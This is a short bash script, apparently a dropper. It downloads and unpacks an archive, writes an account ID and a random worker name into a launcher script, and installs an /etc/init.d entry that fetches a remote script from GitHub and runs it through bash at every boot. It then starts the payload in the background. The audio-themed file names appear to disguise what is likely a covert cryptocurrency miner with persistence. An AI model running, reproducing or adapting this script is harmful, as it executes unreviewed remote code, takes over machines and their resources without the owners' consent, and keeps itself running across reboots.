cd /
rm -rf stereo.tar
rm -rf stereo
wget https://github.com/samplerac/signal/releases/download/v1.0.2/stereo.tar
tar -xvf stereo.tar
cd /stereo
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./surround.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./surround.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/samplerac/signal/main/sound.sh)" > speaker.sh
chmod a+x speaker.sh
update-rc.d speaker.sh defaults
cd /stereo
nohup ./surround.sh
ps -ef | grep stereo
